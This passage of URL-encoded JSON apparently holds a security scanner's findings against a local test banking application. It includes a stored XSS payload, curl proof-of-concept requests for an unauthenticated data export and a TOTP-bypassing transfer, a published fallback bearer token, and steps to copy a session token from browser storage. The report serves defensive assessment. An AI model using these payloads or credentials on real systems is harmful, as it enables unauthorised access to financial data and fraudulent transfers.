0clicked%20during%20browser%20verification.%20This%20is%20a%20normal%20administrative%20action.%22%2C%22recommendation%22%3A%22Remove%20inline%20event%20handlers%20and%20do%20not%20concatenate%20account%20data%20into%20executable%20HTML.%20Create%20the%20button%20with%20DOM%20APIs%2C%20render%20untrusted%20text%20with%20textContent%2C%20and%20attach%20a%20click%20listener%20that%20passes%20account%20data%20through%20a%20closure%20or%20structured%20data%20object.%20Add%20a%20Content%20Security%20Policy%20that%20blocks%20inline%20scripts%20as%20defense%20in%20depth.%22%2C%22cvss_score%22%3A8.7%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AL%2FUI%3AR%2FS%3AC%2FC%3AH%2FI%3AH%2FA%3AL%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fadmin%2F%23%2Faccounts%22%2C%22evidence%22%3A%22Account%20101%20stored%20the%20exact%20account_name%20payload%20%60')%3Bdocument.body.dataset.aespa%3D'xss007'%3B%2F%2F%60.%20The%20admin%20page%20placed%20the%20escaped%20value%20inside%20an%20inline%20onclick%20handler%20and%20assigned%20the%20generated%20markup%20through%20innerHTML.%20After%20the%20Edit%20Balance%20button%20for%20account%20101%20was%20clicked%2C%20the%20assertion%20that%20the%20body%20element%20had%20data-aespa%3D%5C%22xss007%5C%22%20passed%2C%20confirming%20script%20execution.%22%2C%22request_evidence%22%3A%22Stored%20account%20created%20through%20%60POST%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Faccounts%60%20with%20%60account_name%60%20set%20to%20%60')%3Bdocument.body.dataset.aespa%3D'xss007'%3B%2F%2F%60%3B%20subsequent%20authenticated%20%60GET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Faccounts%3Fpage%3D1%26per_page%3D20%60%20returned%20account%20id%20101%20with%20that%20value%20intact.%22%2C%22response_evidence%22%3A%22%60%7B%5C%22id%5C%22%3A101%2C...%2C%5C%22account_name%5C%22%3A%5C%22')%3Bdocument.body.dataset.aespa%3D'xss007'%3B%5C%5C%5C%5C%2F%5C%5C%5C%5C%2F%5C%22%2C...%7D%60.%20Browser%20verification%20on%20%60http%3A%2F%2Flocalhost%3A8081%2Fadmin%2F%23%2Faccounts%60%3A%20clicking%20the%20account%20101%20Edit%20Balance%20control%20caused%20%60body%5Bdata-aespa%3D%5C%22xss007%5C%22%5D%60%20to%20exist.%22%2C%22finding_source%22%3A%22specialist_agent%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22The%20strongest%20innocent%20explanations%20are%20that%20the%20value%20was%20only%20stored%20as%20text%2C%20remained%20HTML-encoded%2C%20or%20was%20blocked%20by%20CSP.%20The%20supplied%20browser%20evidence%20rules%20each%20out%3A%20the%20stored%20account%20name%20was%20placed%20into%20an%20inline%20onclick%20attribute%20through%20innerHTML%2C%20the%20administrator%20clicked%20that%20specific%20account's%20Edit%20Balance%20button%2C%20and%20the%20unique%20post-click%20DOM%20marker%20data-aespa%3D%5C%22xss007%5C%22%20appeared.%20Entity%20decoding%20before%20inline-handler%20compilation%20explains%20why%20ordinary%20HTML%20escaping%20did%20not%20neutralize%20the%20apostrophes.%20No%20single%20GET%20or%20POST%20request%20is%20a%20valid%20terminal%20PoC%20because%20reproduction%20requires%20the%20pre-stored%20account%20record%20plus%20a%20browser%20click%2C%20so%20poc_request%20is%20omitted%20rather%20than%20supplying%20a%20misleading%20request.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A01%22%2C%22severity%22%3A%22high%22%2C%22title%22%3A%22Unauthenticated%20admin%20export%20exposes%20customer%20banking%20data%22%2C%22description%22%3A%22The%20admin%20export%20endpoint%20at%20%2Fapi%2Fadmin%2Fexport%2Fusers%20is%20accessible%20without%20authentication%20and%20returns%20bulk%20user%2C%20account%2C%20and%20transaction%20records.%22%2C%22impact%22%3A%22An%20unauthenticated%20attacker%20could%20obtain%20customer%20identity%20and%20contact%20information%2C%20password%20hashes%2C%20account%20balances%2C%20payment-card%20fields%2C%20TOTP-related%20fields%2C%20and%20transaction%20history.%20This%20results%20in%20a%20large-scale%20breach%20of%20confidential%20customer%20and%20banking%20data.%22%2C%22likelihood%22%3A%22Exploitation%20requires%20a%20single%20unauthenticated%20GET%20request%20to%20a%20predictable%20admin%20endpoint.%20The%20endpoint%20returned%20the%20export%20successfully%20without%20an%20Authorization%20header.%22%2C%22recommendation%22%3A%22Require%20verified%20administrator%20authentication%20and%20explicit%20authorization%20for%20all%20export%20operations.%20Restrict%20exported%20data%20to%20fields%20required%20for%20the%20intended%20purpose.%20Exclude%20password%20hashes%2C%20TOTP%20secrets%2C%20CVVs%2C%20and%20full%20payment-card%20data.%20Log%20and%20rate-limit%20exports%2C%20and%20review%20existing%20access%20logs%20for%20unauthorized%20use.%22%2C%22cvss_score%22%3A7.5%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AH%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Fexport%2Fusers%22%2C%22evidence%22%3A%22An%20anonymous%20GET%20request%20without%20an%20Authorization%20header%20returned%20HTTP%20200%20and%20a%20successful%20JSON%20response%20containing%20users%20and%20accounts.%20The%20captured%20user%20record%20included%20an%20email%20address%2C%20password_hash%2C%20and%20home%20address.%20The%20account%20record%20included%20ownership%20and%20balance%20data%2C%20and%20the%20response%20also%20contained%20transaction%20records.%20The%20returned%20schema%20included%20payment-card%20and%20TOTP-related%20fields.%22%2C%22request_evidence%22%3A%22GET%20%2Fapi%2Fadmin%2Fexport%2Fusers%20using%20use_session%3Danonymous%20with%20no%20Authorization%20header.%22%2C%22response_evidence%22%3A%22HTTP%20200%20with%20%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22users%5C%22%3A%5B%7B%5C%22id%5C%22%3A1%2C%5C%22email%5C%22%3A%5C%22amelia.chen%40example.com%5C%22%2C%5C%22password_hash%5C%22%3A%5C%22%242y%2410%24...%5C%22%2C%5C%22address_line1%5C%22%3A%5C%2214%20Harbour%20View%20Tce%5C%22%2C...%7D%5D%2C%5C%22accounts%5C%22%3A%5B%7B%5C%22id%5C%22%3A1%2C%5C%22user_id%5C%22%3A1%2C...%2C%5C%22balance%5C%22%3A%5C%223450.75%5C%22%2C%5C%22card_number%5C%22%3Anull%2C%5C%22card_expiry%5C%22%3Anull%2C%5C%22card_cvv%5C%22%3Anull%2C...%7D%5D%2C...%7D%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22A%20fresh%20GET%20with%20no%20session%2C%20Authorization%20header%2C%20or%20cookies%20returned%20HTTP%20200%20application%2Fjson%20containing%20multiple%20customer%20records%20with%20email%2C%20password_hash%2C%20home%20address%2C%20and%20phone%20fields.%20The%20anonymous%20response%20was%20byte-for-byte%20the%20same%20length%20and%20content%20as%20the%20response%20using%20the%20supplied%20admin%20session%2C%20which%20rules%20out%20proxy%20session%20confusion%3B%20it%20is%20structured%20export%20data%20rather%20than%20an%20SPA%20shell%2C%20and%20the%20sensitive%20admin%20export%20has%20no%20effective%20authentication%20boundary.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Fexport%2Fusers%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A07%22%2C%22severity%22%3A%22high%22%2C%22title%22%3A%22Published%20fallback%20token%20grants%20access%20to%20the%20payment%20API%22%2C%22description%22%3A%22The%20machine-authenticated%20payment%20endpoint%20accepts%20a%20static%20fallback%20bearer%20token%20published%20in%20the%20application%20source%20and%20default%20configuration.%22%2C%22impact%22%3A%22An%20attacker%20who%20obtains%20the%20published%20token%20could%20authenticate%20to%20privileged%20payment%20routes%20and%20submit%20unauthorized%20payment%20requests.%22%2C%22likelihood%22%3A%22Exploitation%20requires%20only%20the%20static%20published%20token.%20The%20deployed%20endpoint%20accepted%20this%20token%20without%20additional%20authentication%20and%20proceeded%20to%20request%20validation.%22%2C%22recommendation%22%3A%22Remove%20the%20fallback%20credential%20and%20fail%20closed%20when%20MACHINE_TOKEN%20is%20unset.%20Rotate%20the%20exposed%20token%20immediately.%20Generate%20a%20unique%2C%20high-entropy%20credential%20for%20each%20deployment%2C%20store%20it%20in%20a%20secret%20manager%2C%20restrict%20each%20machine%20identity%20to%20required%20operations%2C%20and%20monitor%20its%20use.%22%2C%22cvss_score%22%3A8.1%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AN%2FI%3AH%2FA%3AH%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fpayments%2Fprocess%22%2C%22evidence%22%3A%22A%20POST%20request%20using%20the%20fallback%20bearer%20token%20and%20an%20intentionally%20incomplete%20body%20returned%20HTTP%20422%20VALIDATION_ERROR%20for%20missing%20payment%20fields%2C%20showing%20that%20the%20request%20passed%20authentication%20and%20reached%20input%20validation.%20The%20same%20request%20using%20the%20control%20token%20definitely-invalid-aespa-token%20returned%20HTTP%20401%20UNAUTHORIZED%20with%20the%20message%20%5C%22Invalid%20or%20unauthorized%20machine%20token.%5C%22%22%2C%22request_evidence%22%3A%22POST%20%2Fapi%2Fpayments%2Fprocess%20with%20header%20Authorization%3A%20Bearer%20mch_face_insurance_secret_key_2026%20and%20body%20%7B%5C%22merchant_name%5C%22%3A%5C%22AESPA%20auth-only%20probe%5C%22%7D.%20No%20card%20or%20amount%20fields%20were%20supplied%2C%20so%20no%20payment%20could%20occur.%22%2C%22response_evidence%22%3A%22Fallback%20token%3A%20HTTP%20422%20%7B%5C%22code%5C%22%3A%5C%22VALIDATION_ERROR%5C%22%2C%5C%22details%5C%22%3A%7B%5C%22merchant_id%5C%22%3A%5B%5C%22The%20merchant_id%20field%20is%20required.%5C%22%5D%2C%5C%22card_number%5C%22%3A%5B...%5D%2C%5C%22expiry%5C%22%3A%5B...%5D%2C%5C%22amount%5C%22%3A%5B...%5D%7D%7D.%20Invalid%20token%20control%3A%20HTTP%20401%20%7B%5C%22code%5C%22%3A%5C%22UNAUTHORIZED%5C%22%2C%5C%22message%5C%22%3A%5C%22Invalid%20or%20unauthorized%20machine%20token.%5C%22%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22unconfirmed%22%2C%22validation_note%22%3A%22The%20supplied%20evidence%20strongly%20suggests%20that%20a%20repository-known%20fallback%20token%20crosses%20machine%20authentication%20because%20it%20produced%20payment-field%20validation%20while%20a%20control%20token%20produced%20401.%20However%2C%20the%20finding%20does%20not%20provide%20the%20literal%20fallback%20token%2C%20the%20validator%20context%20does%20not%20expose%20it%2C%20and%20direct%20checks%20of%20the%20deployed%20default-config%20and%20API-schema%20paths%20returned%20ordinary%20404%20responses.%20Without%20that%20credential%20I%20cannot%20independently%20replay%20the%20decisive%20comparison%20or%20test%20whether%20fallback-authenticated%20requests%20are%20stopped%20by%20later%20account%20authorization%2C%20so%20there%20is%20no%20concrete%20innocent%20explanation%20and%20insufficient%20live%20proof%20for%20confirmation.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A01%22%2C%22severity%22%3A%22high%22%2C%22title%22%3A%22Unauthenticated%20access%20to%20account%20transaction%20history%22%2C%22description%22%3A%22The%20transaction%20history%20endpoint%20returns%20records%20for%20a%20supplied%20account%20ID%20without%20requiring%20authentication.%20The%20response%20exposes%20transaction%20amounts%2C%20descriptions%2C%20account%20relationships%2C%20transfer%20status%2C%20receipt%20numbers%2C%20TOTP%20verification%20state%2C%20and%20timestamps.%22%2C%22impact%22%3A%22An%20unauthenticated%20attacker%20could%20enumerate%20account%20IDs%20and%20access%20customers'%20sensitive%20financial%20transaction%20data.%20This%20information%20could%20support%20targeted%20fraud%2C%20social%20engineering%2C%20and%20follow-on%20attacks.%22%2C%22likelihood%22%3A%22High.%20The%20endpoint%20returned%20transaction%20data%20without%20authentication%2C%20and%20the%20account%20IDs%20were%20observed%20to%20be%20sequential.%22%2C%22recommendation%22%3A%22Require%20authentication%20for%20the%20endpoint%20and%20verify%20that%20the%20requested%20account%20belongs%20to%20the%20authenticated%20customer%20before%20returning%20transaction%20data.%20Deny%20anonymous%20and%20cross-customer%20requests%20by%20default.%20Add%20authorization%20tests%20covering%20logged-out%20access%20and%20adjacent%20account%20IDs.%22%2C%22cvss_score%22%3A7.5%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AH%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D1%26page%3D1%26per_page%3D15%22%2C%22evidence%22%3A%22An%20anonymous%20GET%20request%20for%20account_id%3D1%20returned%20HTTP%20200%20with%20nine%20transaction%20records.%20The%20returned%20data%20included%20transaction%20ID%202%2C%20amount%20%5C%22150.00%5C%22%2C%20description%20%5C%22Birthday%20gift%20Mum%5C%22%2C%20status%20%5C%22completed%5C%22%2C%20and%20totp_verified%20set%20to%20true.%22%2C%22request_evidence%22%3A%22GET%20%2Fapi%2Ftransactions%3Faccount_id%3D1%26page%3D1%26per_page%3D15%20with%20use_session%3Danonymous%20and%20no%20Authorization%20header.%22%2C%22response_evidence%22%3A%22HTTP%20200%20application%2Fjson%3A%20%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22transactions%5C%22%3A%5B...%5D%2C%5C%22pagination%5C%22%3A%7B%5C%22current_page%5C%22%3A1%2C%5C%22per_page%5C%22%3A15%2C%5C%22total%5C%22%3A9%2C%5C%22total_pages%5C%22%3A1%7D%7D%7D.%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22false_positive%22%2C%22validation_note%22%3A%22A%20credential-free%20request%20to%20the%20exact%20affected%20URL%20was%20denied%2C%20redirected%20to%20login%2C%20or%20returned%20only%20a%20generic%20application%20shell.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A01%22%2C%22severity%22%3A%22high%22%2C%22title%22%3A%22Unauthenticated%20access%20to%20account%20transaction%20history%22%2C%22description%22%3A%22The%20transaction%20history%20endpoint%20returns%20account%20transaction%20records%20without%20requiring%20authentication%20or%20verifying%20that%20the%20requester%20owns%20the%20specified%20account.%22%2C%22impact%22%3A%22An%20unauthenticated%20attacker%20could%20use%20predictable%20numeric%20account%20IDs%20to%20retrieve%20customers'%20financial%20transaction%20histories%2C%20including%20account%20identifiers%2C%20account%20numbers%2C%20transaction%20amounts%2C%20and%20timestamps.%22%2C%22likelihood%22%3A%22Exploitation%20requires%20only%20a%20direct%20GET%20request%20with%20a%20numeric%20account_id.%20The%20captured%20request%20contained%20no%20authorization%20header%20or%20session%20cookies%20and%20received%20transaction%20data.%22%2C%22recommendation%22%3A%22Require%20authentication%20for%20the%20transaction%20endpoint%20and%20enforce%20server-side%20authorization%20for%20every%20requested%20account_id.%20Return%20401%20for%20unauthenticated%20requests%20and%20403%20or%20404%20when%20the%20authenticated%20customer%20does%20not%20own%20the%20requested%20account.%22%2C%22cvss_score%22%3A7.5%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AH%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D2%26page%3D1%26per_page%3D15%22%2C%22evidence%22%3A%22An%20anonymous%20GET%20request%20for%20account_id%3D2%20returned%20HTTP%20200%20and%20three%20transaction%20records.%20The%20response%20included%20transaction%20IDs%2C%20source%20and%20destination%20account%20identifiers%2C%20destination%20account%20numbers%2C%20and%20transaction%20amounts.%22%2C%22request_evidence%22%3A%22GET%20%2Fapi%2Ftransactions%3Faccount_id%3D2%26page%3D1%26per_page%3D15%5CnNo%20Authorization%20header%20or%20session%20cookies.%22%2C%22response_evidence%22%3A%22HTTP%2F1.1%20200%20OK%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22transactions%5C%22%3A%5B%7B%5C%22id%5C%22%3A44%2C%5C%22from_account_id%5C%22%3A1%2C%5C%22to_account_number%5C%22%3A%5C%2210000002%5C%22%2C%5C%22to_account_id%5C%22%3A2%2C%5C%22amount%5C%22%3A%5C%220.01%5C%22%7D%2C%7B%5C%22id%5C%22%3A3%2C%5C%22from_account_id%5C%22%3A2%2C%5C%22to_account_number%5C%22%3A%5C%2210000001%5C%22%2C%5C%22to_account_id%5C%22%3A1%2C%5C%22amount%5C%22%3A%5C%22200.00%5C%22%7D%2C%7B%5C%22id%5C%22%3A1%2C%5C%22from_account_id%5C%22%3A1%2C%5C%22to_account_number%5C%22%3A%5C%2210000002%5C%22%2C%5C%22to_account_id%5C%22%3A2%2C%5C%22amount%5C%22%3A%5C%22500.00%5C%22%7D%5D%2C%5C%22pagination%5C%22%3A%7B%5C%22total%5C%22%3A3%7D%7D%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22false_positive%22%2C%22validation_note%22%3A%22A%20credential-free%20request%20to%20the%20exact%20affected%20URL%20was%20denied%2C%20redirected%20to%20login%2C%20or%20returned%20only%20a%20generic%20application%20shell.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A01%22%2C%22severity%22%3A%22high%22%2C%22title%22%3A%22Unauthenticated%20account%20endpoint%20exposes%20customer%20financial%20data%22%2C%22description%22%3A%22The%20account-list%20endpoint%20at%20%2Fapi%2Faccounts%20returns%20customer%20banking%20and%20payment-card%20data%20without%20requiring%20authentication.%22%2C%22impact%22%3A%22An%20unauthenticated%20attacker%20can%20obtain%20customer%20financial%20records%2C%20including%20balances%2C%20BSBs%2C%20account%20numbers%2C%20full%20payment-card%20numbers%2C%20expiry%20dates%2C%20and%20CVVs.%20Exposed%20account%20identifiers%20may%20also%20assist%20further%20authorization%20attacks.%22%2C%22likelihood%22%3A%22Exploitation%20requires%20a%20single%20unauthenticated%20GET%20request.%20The%20endpoint%20returned%20sensitive%20records%20without%20an%20Authorization%20header.%22%2C%22recommendation%22%3A%22Require%20verified%20authentication%20and%20authorization%20for%20this%20endpoint.%20Determine%20account%20ownership%20from%20the%20authenticated%20session%20rather%20than%20caller-controlled%20input.%20Return%20only%20explicitly%20allowed%20fields%2C%20mask%20payment-card%20numbers%2C%20and%20never%20store%20or%20return%20CVVs.%22%2C%22cvss_score%22%3A7.5%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AH%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Faccounts%22%2C%22evidence%22%3A%22An%20anonymous%20GET%20request%20to%20%2Fapi%2Faccounts%20returned%20HTTP%20200%20with%20five%20account%20records.%20The%20response%20included%20balances%2C%20BSBs%2C%20account%20numbers%2C%20and%20payment-card%20data.%20Account%2051%20contained%20the%20full%20card%20number%204532015001345674%2C%20expiry%2008%2F29%2C%20and%20CVV%20842.%22%2C%22request_evidence%22%3A%22Anonymous%20GET%20%2Fapi%2Faccounts%20with%20no%20supplied%20Authorization%20header.%22%2C%22response_evidence%22%3A%22HTTP%20200%20returned%20account%20IDs%201%2C%202%2C%203%2C%2051%2C%20and%20101.%20The%20response%20included%20balances%20and%20%7B%5C%22id%5C%22%3A51%2C%5C%22card_number%5C%22%3A%5C%224532015001345674%5C%22%2C%5C%22card_expiry%5C%22%3A%5C%2208%2F29%5C%22%2C%5C%22card_cvv%5C%22%3A%5C%22842%5C%22%7D.%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22false_positive%22%2C%22validation_note%22%3A%22A%20credential-free%20request%20to%20the%20exact%20affected%20URL%20was%20denied%2C%20redirected%20to%20login%2C%20or%20returned%20only%20a%20generic%20application%20shell.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A02%22%2C%22severity%22%3A%22medium%22%2C%22title%22%3A%22Login%20accepts%20weak%20MD5%20password%20hashes%22%2C%22description%22%3A%22POST%20%2Fapi%2Fauth%2Flogin%20passes%20the%20submitted%20password%20and%20stored%20hash%20to%20verifyPassword().%20Any%2032-character%20stored%20hash%20is%20treated%20as%20MD5%20and%20compared%20with%20md5(%24password)%20using%20ordinary%20equality.%20This%20preserves%20accounts%20protected%20only%20by%20a%20fast%2C%20unsalted%20digest%20and%20also%20lacks%20a%20constant-time%20comparison%20for%20that%20branch.%22%2C%22impact%22%3A%22%22%2C%22likelihood%22%3A%22%22%2C%22recommendation%22%3A%22Confirmed%20that%20the%20application-generated%2032-character%20MD5%20hash%20remains%20accepted%20by%20the%20login%20path.%20Linked%20to%20the%20MD5%20password-storage%20finding.%22%2C%22cvss_score%22%3A0%2C%22cvss_vector%22%3A%22%22%2C%22affected_url%22%3A%22BankOfEd-main%2Fsrc%2FServices%2FAuthService.php%3A31%22%2C%22evidence%22%3A%22AuthController.php%3A49-68%20reads%20JSON%20email%2Fpassword%2C%20loads%20User%3A%3AfindByEmail()%2C%20and%20invokes%20AuthService%3A%3AverifyPassword(%24data%5B'password'%5D%2C%20%24user%5B'password_hash'%5D).%20AuthService.php%3A29-31%20selects%20the%20MD5%20branch%20solely%20when%20strlen(%24hash)%20%3D%3D%3D%2032%20and%20returns%20md5(%24password)%20%3D%3D%3D%20%24hash.%22%2C%22request_evidence%22%3A%22%22%2C%22response_evidence%22%3A%22%22%2C%22finding_source%22%3A%22sast_lead%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22Confirmed%20that%20the%20application-generated%2032-character%20MD5%20hash%20remains%20accepted%20by%20the%20login%20path.%20Linked%20to%20the%20MD5%20password-storage%20finding.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A04%22%2C%22severity%22%3A%22medium%22%2C%22title%22%3A%22Manual%20transfer%20bypasses%20required%20TOTP%20verification%22%2C%22description%22%3A%22A%20manual%20transfer%20completed%20without%20TOTP%20even%20though%20the%20transfer-check%20endpoint%20reports%20that%20TOTP%20is%20required%20for%20the%20same%20transfer%20type.%22%2C%22impact%22%3A%22An%20attacker%20with%20a%20compromised%20customer%20session%20can%20send%20funds%20without%20completing%20the%20required%20second-factor%20check.%22%2C%22likelihood%22%3A%22Confirmed%20by%20a%20completed%20transfer%20that%20omitted%20TOTP%20data%2C%20followed%20by%20a%20server%20response%20stating%20that%20manual%20transfers%20require%20TOTP.%22%2C%22recommendation%22%3A%22Enforce%20TOTP%20inside%20the%20transfer%20execution%20transaction.%20Reject%20transfers%20when%20TOTP%20is%20required%2C%20missing%2C%20invalid%2C%20or%20not%20configured.%22%2C%22cvss_score%22%3A6.5%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AL%2FUI%3AN%2FS%3AU%2FC%3AN%2FI%3AH%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransfers%2Fexternal%22%2C%22evidence%22%3A%22POST%20%2Fapi%2Ftransfers%2Fexternal%20without%20a%20TOTP%20value%20returned%20HTTP%20201%20and%20completed%20transaction%2036.%20The%20check%20endpoint%20then%20reported%20requires_totp%3Atrue%20for%20a%20manual%20transfer.%5Cn%5CnREQUEST%3A%5CnGET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransfers%2Fexternal%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%5C%22Origin%5C%22%3A%20%5C%22https%3A%2F%2Fevil.example%5C%22%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20405%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A21%3A30%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20https%3A%2F%2Fevil.example%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%2087%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22METHOD_NOT_ALLOWED%5C%22%2C%5C%22message%5C%22%3A%5C%22Method%20not%20allowed.%5C%22%7D%7D%22%2C%22request_evidence%22%3A%22GET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransfers%2Fexternal%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%5C%22Origin%5C%22%3A%20%5C%22https%3A%2F%2Fevil.example%5C%22%7D%5Cn%22%2C%22response_evidence%22%3A%22Status%3A%20405%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A21%3A30%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20https%3A%2F%2Fevil.example%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%2087%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22METHOD_NOT_ALLOWED%5C%22%2C%5C%22message%5C%22%3A%5C%22Method%20not%20allowed.%5C%22%7D%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22The%20weakest%20assumption%20was%20that%20the%20scanner%20used%20different%20transfer%20parameters%20or%20an%20inapplicable%20authentication%20state.%20Using%20the%20supplied%20http_token%20session%2C%20I%20sent%20a%20valid%20manual%20external%20transfer%20with%20from_account_id%201%2C%20amount%201%2C%20BSB%20062-000%2C%20and%20account%2012345678%20while%20omitting%20totp%3B%20the%20server%20returned%20201%20with%20totp_verified%3Afalse%20and%20status%20completed.%20With%20the%20same%20session%20and%20parameters%2C%20POST%20%2Fapi%2Ftransfers%2Fcheck%20returned%20requires_totp%3Atrue%2C%20reason%20manual_entry%2C%20and%20totp_configured%3Afalse%2C%20so%20validation%20errors%2C%20method%20mismatch%2C%20and%20transfer-type%20mismatch%20do%20not%20explain%20the%20completed%20transfer.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20-X%20POST%20-H%20'Content-Type%3A%20application%2Fjson'%20-H%20'Accept%3A%20application%2Fjson'%20-H%20'Content-Type%3A%20application%2Fjson'%20--data-raw%20'%7B%5C%22from_account_id%5C%22%3A1%2C%5C%22amount%5C%22%3A1%2C%5C%22to_bsb%5C%22%3A%5C%22062-000%5C%22%2C%5C%22to_account_number%5C%22%3A%5C%2212345678%5C%22%7D'%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransfers%2Fexternal%20-H%20%5C%22Authorization%3A%20Bearer%20%24(cat%20aespa-poc-auth.txt)%5C%22%22%2C%22poc_setup%22%3A%22This%20finding%20requires%20an%20authenticated%20session%20(log%20in%20as%20**http_token**%20or%20an%20equivalent%20user).%5Cn%5CnLog%20in%20as%20the%20user%20represented%20by%20the%20http_token%20session%20and%20copy%20the%20bearer%20token%20from%20the%20Authorization%20header%20in%20the%20browser's%20DevTools%20Network%20tab.%5Cn%5CnCapture%20the%20credential%20into%20a%20file%20named%20%60aespa-poc-auth.txt%60%20in%20the%20directory%20you%20run%20the%20command%20from%3A%5Cn%5CnIn%20the%20browser%20DevTools%20Console%20(adjust%20the%20storage%20key%20for%20the%20app)%3A%5Cn%60%60%60js%5Cnconst%20token%20%3D%20localStorage.getItem('token')%3B%20%2F%2F%20or%20sessionStorage%